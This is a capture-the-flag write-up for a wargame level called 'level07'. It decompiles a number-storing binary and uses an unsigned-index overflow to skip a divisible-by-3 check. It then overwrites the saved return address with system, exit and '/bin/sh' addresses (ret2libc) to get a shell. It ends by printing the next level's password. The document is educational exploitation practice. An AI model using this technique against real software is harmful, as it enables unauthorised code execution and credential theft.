# Level07

## Setup

We find a binary file at the root of the user **`level07`** named *`./level07`*.

```bash
scp -r -P 4242 level07@<vm_ip>:/home/users/level07/level07 .
```

### Hex-Rays

We used the Hex-Rays output on the [Dogbolt website](https://dogbolt.org/).


## Source
```C
int data[100];
...
while ( 1 ) {
	...
	fgets(s, 20, stdin);
	if ( !memcmp(s, "store", 5u) ) {
		number = store_number(*data);
		...
	}
	if ( !memcmp(s, "read", 4u) ) {
		number = read_number(*data);
		...
	}
	if ( !memcmp(s, "quit", 4u) ) {
		return 0;
	}
	...
}
```
`store_number`:
```C
int store_number(int data) {
	unsigned int number;
	unsigned int index;
	...
	number = get_unum();
	...
	index = get_unum();
	if ( index == 3 * (index / 3) || (number >> 24) == 183 ) {
		...
		return 1;
	}
	else {
		*(int *)(data + index * 4) = number;
		return 0;
	}
}
```
So, we can write any unsigned int at any index of our array that isn't dividable by 3 \
After some tests we know we want to overwrite the address that eip points to as it is in the stack

## gdb
```bash
> b main
> b read_number (or store_number)
> r
> info frame
...
...eip at 0xffffd70c
...
> read
> i r $eax #(our array's address as it is the first and only argument of read_number())
eax	0xffffd544
```
`eip` = 0xffffd70c \
`array` = 0xffffd544 \
eip - array = 456 \
456 / 4 = 114 (We divide by 4 because 1 index of our array is 4 bytes)

so `eip = array[114]` \
BUT 114 % 3 == 0, So we can't write as it is a wil's reserved space \
But the array's index access is done by: `array_address + (index * 4)` \
And the wil's reserved space is made before \
The index is an unsigned int, we'll make a full value overflow (0x100000000) and 456 so the index becomes 114 after the *4\
so `(0x100000000 + 456) / 4 = 1073741938` \
By writing at the index 1073741938 we actually write at the index 114, so we overwrite the address eip points to

We retrieve the addresses of: \
`system`	: 0xf7e6aed0, in decimal: `4159090384` \
`exit`	: 0xf7e5eb70, in decimal: `4159040368` \
`/bin/sh`	: 0xf7f897ec, in decimal: `4160264172`

## Solution:
```bash
> ./level07
> store
> 4159090384
> 1073741938
> store
> 4159040368
> 115
> store
> 4160264172
> 116
> quit
> cat /home/users/level08/.pass
7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
```